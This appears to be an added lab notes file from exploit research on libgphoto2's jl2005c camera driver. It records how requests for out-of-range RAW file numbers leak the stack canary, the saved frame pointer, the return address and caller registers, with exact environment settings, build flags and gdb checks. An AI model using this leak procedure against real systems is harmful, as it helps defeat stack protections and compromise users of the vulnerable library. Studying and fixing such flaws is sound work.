@@ -1,0 +1,124 @@
+# W177 (2026-11-24 22:35–22:44Z): real-API disclosure of the overflowed
+# stack frame through the JL2005 RAW file consumer. Author experiment, NOT
+# a witness verdict. Rung 4 author-side; rung 5 UNKNOWN.
+
+## Setup (no new source patch to the camlib)
+
+Throwaway tree `/tmp/w174-lgp/lab/frontier/libgphoto2shell`, the same
+`git archive 833729ad` extraction used by W174/W175. No camlib source was
+changed this wake: the live vulnerable file hashes exactly to the pin:
+
+  sha256 pins/jl2005c.c.vuln                 = 0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
+  sha256 /tmp/w174-lgp/.../camlibs/jl2005c/jl2005c.c = 0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
+
+The tree retains W175's local-only vusb changes: cap `n` before the `memset`
+(`M2SHELL_JL2005_LEN`), widen the mode-v victim condition, guard chunks,
+`M2SHELL_JL2005_TOTAL`. New lab probe: `replay-stack-leak-probe.c` (this
+directory); gdb map script: `replay-w177-map.gdb`. Built with
+`gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include $(pkg-config --cflags glib-2.0)
+    replay-stack-leak-probe.c -o probe -L$P/lib -lgphoto2 -lgphoto2_port $(pkg-config --libs glib-2.0)`
+where `P=<tree>/src/libgphoto2-2.5.34-plain/installdir-plain`.
+
+Environment for every positive case (short reply stops 8 bytes before the
+jl2005c_init canary; count 1053 still rounds to alloc_table_size 0x4200 so
+the :154 memmove is W175's 16848-byte source over-read):
+
+  CAMLIBS=$P/lib/libgphoto2/2.5.34
+  IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib
+  M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1053
+  M2SHELL_JL2005_LEN=0x3E28 M2SHELL_VUSB_GUARDS=4 M2SHELL_VUSB_DRAIN=28
+  M2SHELL_JL2005_FILL=0 M2SHELL_JL2005_TOTAL=1
+
+`gp_camera_file_get(cam, "/", "jl_%03i.ppm", GP_FILE_TYPE_RAW, file, NULL)`
+calls `camlibs/jl2005c/library.c:213`
+`memcpy(pic_buffer, camera->pl->table + 16*k, 16)` where k is the filename
+number minus one. Thus k>=1024 reads PAST the fixed 16384-byte `Info
+table[0x4000]` into the bytes the :154 memmove copied from the stack.
+List names are lexicographically sorted, so names must be requested by
+number, not by list index.
+
+## Positive 1: canary at table k=1023 (info+0x4028), 3 fresh processes
+
+Each line: OWN_CANARY read with `mov %fs:0x28` in the probe; `data` is the
+16-byte RAW record. Last 8 bytes are the canary in all three runs:
+
+  OWN_CANARY=e90cd18f84018800
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=0000000000000000008801848fd10ce9
+  OWN_CANARY=b4c098dd77f23f00
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=0000000000000000003ff277dd98c0b4
+  OWN_CANARY=c3b5fb66bcac4900
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=00000000000000000049acbc66fbb5c3
+
+## Positive 2: saved frame pointer and return address at k=1024
+(info+0x4030..0x403f = the slots W167 overwrites with `&marker`)
+
+  OWN_CANARY=cf0b6850490df500 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=f05aebb1fd7f0000803ac5ec73760000
+  OWN_CANARY=2ddcac533eace000 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=0081a5ccff7f0000806ace6a847b0000
+  OWN_CANARY=2ea3bd8427f7b900 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=b0379104fd7f0000800a1121be740000
+
+First word is a stack address (0x7fff...); second is a code address that
+changes with ASLR. gdb, in the SAME process, at `break jl2005c_init`:
+
+  GDB_JL_RBP=0x7fffffffc960
+  GDB_SAVED_RBP=0x7fffffffca40
+  GDB_SAVED_RIP=0x7ffff7bf5a80
+  OWN_CANARY=bf5ab56fc78cb600
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=000000000000000000b68cc76fb55abf
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=40caffffff7f0000805abff7ff7f0000
+
+The two leaked words are byte-for-byte `GDB_SAVED_RBP` and `GDB_SAVED_RIP`;
+the k=1023 canary is byte-for-byte `OWN_CANARY`.
+
+## Positive 3: caller RBX/RBP/RIP for the W171 normal-return chain
+
+  file=jl_1037.ppm table_k=1036 rc=0 size=16 data=040000000000000000dfc4bb8779d901
+      (second word = OWN_CANARY, a second frame's canary copy)
+  file=jl_1038.ppm table_k=1037 rc=0 size=16 data=90036e05b555000090036e05b5550000
+      (info+0x4108: caller RBX-shaped static/heap pointer)
+  file=jl_1039.ppm table_k=1038 rc=0 size=16 data=a03d501ffe7f0000f3d09fb73a750000
+      (info+0x4110/0x4118: caller RBP and caller RIP)
+
+gdb verification in the same process (`replay-w177-map.gdb`):
+
+  GDB_R1=0x7fffffffc960
+  GDB_AT_R1=0x7fffffffca40
+  GDB_AT_R1_8=0x7ffff7bf5a80
+  GDB_R2=0x7fffffffca40
+  GDB_R2_MINUS8=0x55555555a3a0
+  GDB_AT_R2=0x7fffffffd4e0
+  GDB_AT_R2_8=0x7ffff7f3a0f3
+  OWN_CANARY=d0958ab4415eae00
+  file=jl_1039.ppm table_k=1038 rc=0 size=16 data=e0d4ffffff7f0000f3a0f3f7ff7f0000
+
+The k=1038 words equal `GDB_AT_R2` (caller RBP) and `GDB_AT_R2_8`
+(caller RIP) exactly. The k=1037 second word is the GDB_R2_MINUS8 slot
+(0x55555555a3a0 under gdb's PIE base; a different static/heap address in
+the non-gdb runs, as expected).
+
+## Controls
+
+- COUNT=100 (safe device count), same LEN/GUARDS/DRAIN: `gp_camera_init rc=0`,
+  `file=jl_1025.ppm table_k=1024 rc=-108` (GP_ERROR_FILE_NOT_FOUND). No entry,
+  no disclosure.
+- Full reply (M2SHELL_JL2005_LEN unset, COUNT=1053): `*** stack smashing
+  detected ***`, process aborts before any file_get (rc=134).
+- COUNT=1054, where the :154 memmove grows to 17360 bytes, needs
+  GUARDS>=8 and DRAIN>=26 for init to survive; with GUARDS=4 a second
+  `file_get` trips `free(): double free detected in tcache 2`. This is a
+  geometry limit of the lab consumer, not a different device condition.
+
+## Ceiling / disposition
+
+This is a genuine disclosure of control-flow state through a real public
+API of the unmodified vulnerable 2.5.34 camlib: canary, saved frame pointer
+and return address, and caller RBX/RBP/RIP, all verified against gdb
+observations inside the same process. It means the W167/W171 author-side
+gdb *reads* could in principle be replaced by real-API reads plus a second
+reply. It does NOT remove the W176 ceiling: the bytes are returned to a
+HOST consumer; no `gp_port_write` in this camlib echoes table bytes to the
+device, so a malicious device cannot learn them. No physical/wire path, no
+device-only canary recovery, no pointer chosen by the device, no command,
+no witness replay. Grade unchanged: rung 4 author-side, rung 5 UNKNOWN.
